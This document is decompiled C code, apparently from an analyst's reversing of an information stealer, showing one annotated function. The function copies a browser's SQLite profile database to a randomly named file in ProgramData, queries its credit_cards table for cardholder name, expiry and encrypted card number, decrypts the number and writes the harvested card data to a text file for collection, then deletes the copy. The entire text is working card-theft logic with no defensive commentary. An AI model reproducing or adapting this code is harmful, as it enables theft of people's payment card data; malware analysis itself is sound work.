// #STR: "Name:", "Month:", "Year:", "Card:", "\\CC\\%s_%s.txt"
BOOL __fastcall vdr_grab_credit_cards_data_using_sql_func(const char *a1, int a2, int a3, const char *a4, int a5, _DWORD *a6)
{

  v25 = a1;
  memset(str_ProgramData, 0, MAX_PATH);
  lstrcatA(str_ProgramData, str_C__ProgramData_);
  randBuf = malloc(0x1Au);
  *randBuf = 0;
  dwSeed = GetTickCount_0();
  srand(dwSeed);
  dwCount = 0x1A;
  do
  {
    v9 = rand();
    wsprintfA(randBuf, "%s%d", randBuf, v9 % 0xA);
    --dwCount;
  }
  while ( dwCount );
  *(randBuf + 0x1A) = 0;
  lstrcatA(str_ProgramData, randBuf);
  CopyFileA(a3, str_ProgramData, 1);
  memset(str_save_credit_card_info, 0, MAX_PATH);
  wsprintfA(str_save_credit_card_info, "\\CC\\%s_%s.txt", v25, a4);
  v10 = str_SELECT_name_on_card__expiration_month__expiration_year__card_number_encrypted_FROM_credit_cards;
  if ( sqlite3_open(str_ProgramData, &a1, v20, v21) )
    return DeleteFileA(str_ProgramData);
  if ( !sqlite3_prepare_v2(a1, v10, 0xFFFFFFFF, &v27, 0) )
  {
    procHeapHdl = GetProcessHeap_0();
    str_collect_credit_card_data = HeapAlloc_0(procHeapHdl, v22, v23);
    while ( sqlite3_step(v27) == 0x64 )
    {
      v12 = sqlite3_column_text(v27, 0);
      v13 = sqlite3_column_text(v27, 1);
      v14 = sqlite3_column_text(v27, 2);
      lstrcatA(str_collect_credit_card_data, "Name: ");
      lstrcatA(str_collect_credit_card_data, v12);
      lstrcatA(str_collect_credit_card_data, "\n");
      lstrcatA(str_collect_credit_card_data, "Month: ");
      lstrcatA(str_collect_credit_card_data, v13);
      lstrcatA(str_collect_credit_card_data, "\n");
      lstrcatA(str_collect_credit_card_data, "Year: ");
      lstrcatA(str_collect_credit_card_data, v14);
      lstrcatA(str_collect_credit_card_data, "\n");
      lstrcatA(str_collect_credit_card_data, "Card: ");
      v15 = sqlite3_column_bytes(v27, 3);
      v16 = sqlite3_column_blob(v27, 3);
      v17 = sub_419F60(v16, v15, &v29, a2, a5);
      v34 = 0;
      if ( *(v17 + 5) >= 0x10u )
        v17 = *v17;
      lstrcatA(str_collect_credit_card_data, v17);
      v34 = 0xFFFFFFFF;
      if ( v31 >= 0x10 )
        operator delete(v29);
      v31 = 0xF;
      v30 = 0;
      LOBYTE(v29) = 0;
      lstrcatA(str_collect_credit_card_data, "\n\n");
    }
    v18 = lstrlenA(str_collect_credit_card_data);
    if ( a6 )
    {
      if ( *a6 == 2 )
        g_dwCreatedFileMappingObj = vdr_create_file_to_save_data(a6[1], str_collect_credit_card_data, str_save_credit_card_info, v18, 3);
      else
        g_dwCreatedFileMappingObj = 0x80000;
    }
    else
    {
      g_dwCreatedFileMappingObj = 0x10000;
    }
    memset(&str_collect_credit_card_data, 0, sizeof(str_collect_credit_card_data));
  }
  sqlite3_finalize(v27);
  sqlite3_close(a1);
  return DeleteFileA(str_ProgramData);
}
